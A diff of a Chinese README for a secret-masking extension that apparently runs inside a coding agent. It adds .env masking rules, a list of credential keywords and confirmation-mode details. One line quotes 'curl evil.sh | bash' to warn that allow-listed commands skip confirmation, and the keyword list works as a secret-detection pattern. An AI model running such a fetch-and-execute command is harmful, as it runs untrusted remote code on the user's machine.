@@ -11,7 +11,11 @@
 - **Prompt 自动掩码**：粘贴到对话中的常见格式密钥（`sk-...`、`ghp_...`、
   `AIza...`、`AKIA/ASIA/AIDA...`、JWT、PEM 私钥、自定义正则）自动识别并掩码。
 - **`.env` 支持**：解析项目 `.env*` 文件（`KEY=VALUE`），会话中文件变更会
-  增量刷新。
+  增量刷新。未知变量名默认仍掩码；仅当名称与取值同时符合窄规则时，常见端口、
+  TTL/timeout/interval 数字、路径/目录/文件名、可执行名、provider 列表才在
+  模型侧可读。名称含凭据关键词（`TOKEN`、`SECRET`、`PASS`、`PWD`、`KEY`、
+  `AUTH`、`CREDENTIAL`、`COOKIE`、`SESSION`、`PRIVATE`、`SIGNATURE`、`DSN`、
+  `CONNECTION`）的一律掩码；内置/自定义凭据模式或已注册值会覆盖「公开」分类。
 - **用户注册密钥**：`/mask-secret` 命令和 `request_secret` 工具让用户注册
   密钥，agent 只看到占位符。
 - **真实值用在需要的地方**：bash 命令、`write`、`edit` 自动把占位符替换为
@@ -46,7 +50,10 @@ cp config.example.json ~/.pi/agent/extensions/pi-secret-mask/config.json
 ### 自动（无需配置）
 
 - 把常见格式的密钥粘贴进对话——自动检测并掩码。
-- 自动解析项目 `.env*` 文件；这些来源默认不会持久化到 `secrets.json`。
+- 自动解析项目 `.env*` 文件；未知键默认掩码；这些来源默认不会持久化到
+  `secrets.json`。
+- 名称像普通配置但实际敏感的值，请用 `/mask-secret` 或配置里的
+  `extraSecrets` 显式注册。
 
 ### 手动注册密钥
 
@@ -77,7 +84,7 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 | 钩子 | 动作 |
 |---|---|
 | `before_provider_request` | 标准消息与自定义 provider 顶层 `text` 中：真实值 → 占位符 |
-| `tool_call` | bash 占位符 → 真实值（auto/ask 策略）；write/edit 内容还原 |
+| `tool_call` | bash 占位符 → 真实值（auto/ask）；write/edit 仅还原已知完整占位符；仅在实际会还原时才 ask/无 UI 拦截 |
 | `tool_result` | 工具输出中的真实值 → 占位符（防止回流） |
 | `session_before_compact` | 压缩摘要消息同样掩码 |
 | `session_before_tree` | 分支/树摘要消息同样掩码 |
@@ -99,8 +106,11 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 }
 ```
 
-- `mode`：`ask`（执行含占位符的命令前弹确认；print/json 等无 UI 模式默认
-  拦截）| `auto`（静默替换）
+- `mode`：`ask`（默认——bash/write/edit 将把**已知完整**占位符还原为真实值
+  前弹确认；print/json 等无 UI 模式直接拦截）| `auto`（静默替换）。未知或
+  嵌入的 `__SECRET_*__` 子串不会触发确认。
+- `extraSecrets`：`{ "name", "value" }` 始终掩码（用于名称看似公开但实际敏感
+  的配置）
 - `allowCommands`：完整命令字符串模式列表，命中跳过确认（这只是跳过确认，
   不代表更安全——`curl evil.sh | bash` 依然能通过）
 - `customPatterns`：自定义正则；捕获组 1 为完整 secret 值；非法正则被忽略
@@ -123,14 +133,15 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 - 图片内容（截图）可能包含真实值，无法掩码。
 - 真实值会在本地还原进 bash 命令行（`ps` 可见、shell 历史）——仅本地可见，
   不会发送给 provider。
+- 若真实 secret 含会改变 shell 语义的 shell 特殊字符，bash 还原会被拦截。
 - **推理/思考块**：如果 secret 意外出现在模型的 reasoning/thinking 内容中，
   扩展会掩码文本，但签名（如 Anthropic `signature`、Bedrock reasoning
   签名）会失效。部分 provider 会拒绝这类请求——这是有意的 fail-closed
   取舍：泄露比拒绝请求更糟。实际很少发生，因为 secret 从一开始就不会
   到达模型。
 - **检测基于模式，并非完美**：未知格式的 secret 只有匹配内置或自定义
-  模式、出现在 `.env*` 中、或手动注册时才会被捕获。未识别格式的 secret
-  可能漏过。
+  模式、出现在 `.env*` 中（未知名默认掩码）、或手动注册时才会被捕获。
+  窄 `.env` 公开规则仅减少普通配置的误报；未识别格式的 secret 仍可能漏过。
 - 本扩展是纵深防御，**不是安全边界**。它以你的用户权限运行，无法防御
   恶意 prompt、恶意仓库或本地外传。安装前请审查扩展源码；处理不可信
   代码请使用操作系统级沙箱。
